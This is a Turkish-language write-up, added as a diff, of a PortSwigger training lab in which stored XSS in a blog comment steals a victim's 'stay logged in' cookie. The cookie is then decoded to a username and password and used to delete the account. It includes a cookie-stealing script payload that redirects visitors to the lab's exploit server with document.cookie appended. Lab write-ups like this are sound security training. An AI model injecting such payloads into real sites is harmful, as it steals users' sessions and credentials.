@@ -1,0 +1,30 @@
+Lab: Offline password cracking
+url: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
+
+Amaç :
+carlosun hesabını silmek.
+
+Analiz:
+
+    -- Sistemde beni hatırla ile giriş yaptığımızda aslında o cookienin bizim bilgilerimizle yapılmış bir şifreleme sonucu olduğu anlaşılıyor
+    -- Bunnunn için bir önceki lab taktiği işlemeyecektir çünkü orda session bilgisi önemli değildi fakat şu anda önemli
+    -- Bu labı çözmek için sistemden calos kullanıcısının cookielerini çalmamız gerekli
+    -- Bunu yapabilmemiz için sistemde farklı bir zafiyet daha olmalı
+
+Analiz 2:
+
+    -- Yorumlar kısmında <script>alert(1)</script> çalıştırabildiğimi fark ettim
+    -- Cookie çalmamız için XSS yapmamız gerekecek
+    -- Bu labı çözebilmek için gereken payloadı labın verdiği server aracılığı ile kendimize ileteceğiz
+
+Payload: 
+
+    -- <script>document.location=' SİSTEMİN VERDİĞİ SUNUCU ADRESİ '+ document.cookie </script>
+
+    bu payloadla bu sayfayı açan her kişinin cookileri bizim elimize düşecek .YAni aslında kitlesel imha yapmış olduk 
+
+
+Sonuç:
+
+    -- Payload çalıştı serverin loglarında cookieyi yakaldık bu cookie yi çözdüğümüz zaman kullanıcı adı ve şifre elimize geçti
+    -- Hesaba girdik ve hesabı sildik. 
